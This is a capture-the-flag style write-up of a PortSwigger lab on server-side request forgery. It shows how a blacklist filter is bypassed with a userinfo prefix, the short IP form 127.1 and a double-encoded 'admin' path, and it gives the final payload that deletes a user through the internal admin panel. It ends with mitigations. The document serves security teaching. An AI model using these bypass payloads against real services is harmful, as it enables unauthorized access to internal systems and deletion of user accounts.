# SSRF with blacklist-based input filter

**Source:** [PortSwigger](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  
**Category:** SSRF  
**Difficulty:** Practitioner

## Objective
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Vulnerability
This lab has a stock check feature which fetches data from an internal system.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Exploitation

### Steps

1. Access the lab, intercept the stock check request. The request contains:
    ```text
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```

2. Send the request to Repeater and try substituting simple values in the `stockApi` parameter to determine what the filter blocks:
    - `http://localhost/admin` - `400 Bad Request`, `"Illegal character in path at index 17: http://localhost/"`
    - `http://127.0.0.1/admin` - the same
    - `http://127.1/` - the same
    - `http://stock.weliketoshop.net:8080/admin` - `400 Bad Request`, `"Illegal character in path at index 40"`

    It means values `localhost`, `127.0.0.1`, and `admin` are filtered. Additionally, the parser requires the URL to start with the trusted host `stock.weliketoshop.net`.

3. Check whether the root of the trusted host passes the filter:
    ```text
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2F
    ```
    The response returns a list of accounts - so we have access to the admin panel via SSRF, but the `/admin` path is filtered.

4. Bypass the blacklist with two tricks at once:
    - `stock.weliketoshop.net` as **userinfo** (the part before `@`), so the filter sees the trusted prefix,
    - `127.1` as the **real host** (shortened form of `127.0.0.1`, which the blacklist does not catch),
    - `admin` **double-encoded** (`%2561%2564%256D%2569%256E`), so the filter does not see the word `admin`, and the HTTP library decodes it a second time after the filter has passed.

    Payload:
    ```text
    stockApi=http://stock.weliketoshop.net@127.1/%2561%2564%256D%2569%256E
    ```
    The response returns a list of accounts - the bypass works.

5. From the account list, read the user deletion endpoint:
    ```text
    /admin/delete?username=carlos
    ```

6. Send the final payload, building the URL the same way as in step 4 - with userinfo, the real host `127.1`, and double-encoded `admin`:
    ```text
    stockApi=http://stock.weliketoshop.net@127.1/%2561%2564%256D%2569%256E/delete%3Fusername%3Dcarlos
    ```
    After passing through the filter and double decoding, the server performs the request:
    ```text
    http://127.1/admin/delete?username=carlos
    ```
    The response is `302 Found` - lab solved.

### Payload
```text
stockApi=http://stock.weliketoshop.net@127.1/%2561%2564%256D%2569%256E/delete%3Fusername%3Dcarlos
```

### Shortcut
1. Intercept the stock check request and send `stockApi` to Repeater.
2. Use the trusted host as userinfo: `http://stock.weliketoshop.net@127.1/`.
3. Double-encode `admin`: `%2561%2564%256D%2569%256E`.
4. Request `http://stock.weliketoshop.net@127.1/%2561%2564%256D%2569%256E` to reach the admin panel.
5. Request `http://stock.weliketoshop.net@127.1/%2561%2564%256D%2569%256E/delete%3Fusername%3Dcarlos` to delete Carlos.

## Impact
An attacker can bypass SSRF blacklist filters to reach internal admin functionality. By abusing userinfo, short IP notation, and double encoding, the attacker can access the admin panel and delete arbitrary users, leading to full disruption of the application.

## Mitigation
Do not rely on blacklists. Use a strict allowlist of permitted hosts and paths. Resolve and validate the final destination host before making the request. Block internal IP ranges and localhost. Decode input only once and validate after decoding. Disable unnecessary URL parsing quirks such as userinfo and non-standard IP formats.

## Tools
- Burp Suite
- Repeater

## Notes
- The filter blocks `localhost`, `127.0.0.1`, and `admin`.
- The URL must start with the trusted host `stock.weliketoshop.net`.
- Using the trusted host as userinfo satisfies the prefix check.
- `127.1` bypasses the `127.0.0.1` blacklist entry.
- Double encoding `admin` bypasses the keyword filter and is decoded again by the HTTP library.